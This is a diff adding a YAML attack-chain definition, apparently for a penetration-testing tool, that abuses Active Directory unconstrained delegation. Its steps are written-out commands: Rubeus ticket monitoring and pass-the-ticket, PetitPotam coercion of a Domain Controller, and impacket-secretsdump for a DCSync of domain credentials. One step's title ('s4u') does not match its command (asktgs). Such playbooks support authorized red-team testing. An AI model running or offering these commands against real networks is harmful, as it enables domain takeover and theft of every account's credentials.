@@ -1,0 +1,44 @@
+chain_id: unconstrained_delegation
+title: "AD — abuse Unconstrained Delegation to capture privileged TGTs"
+severity: CRITICAL
+tags: [ad, kerberos, unconstrained-delegation, bloodhound, lateral-movement]
+
+trigger:
+  any_of:
+    - { kind: "ad-unconstrained-computer" }
+    - { kind: "ad-unconstrained-user" }
+
+description: |
+  A principal with TRUSTED_FOR_DELEGATION enabled was found. Any
+  authentication TGT that lands on this host gets cached in LSA and can
+  be impersonated. The classic chain is to coerce a Domain Controller
+  to authenticate to the unconstrained host (PetitPotam / PrinterBug),
+  capture its TGT, and replay against any service in the domain.
+
+steps:
+  - id: 1
+    title: "If you have local admin on the unconstrained host, dump TGTs from LSA"
+    command: |
+      # mimikatz / Rubeus on the box itself:
+      Rubeus.exe monitor /interval:5 /nowrap
+
+  - id: 2
+    title: "Coerce the DC to authenticate (PetitPotam)"
+    command: |
+      # From Kali / a foothold:
+      python3 PetitPotam.py -u USUARIO -p PASSWORD -d $DOMAIN $UNCONSTRAINED_HOST $DC
+
+  - id: 3
+    title: "If you only have remote access, use Rubeus s4u to abuse the captured ticket"
+    command: |
+      Rubeus.exe asktgs /service:cifs/$DC /ticket:base64...
+
+  - id: 4
+    title: "Pass the captured DC TGT for DCSync"
+    command: |
+      Rubeus.exe ptt /ticket:base64...
+      impacket-secretsdump $DOMAIN/$DC$ -k -no-pass -just-dc
+
+references:
+  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/unconstrained-delegation
+  - https://github.com/topotam/PetitPotam
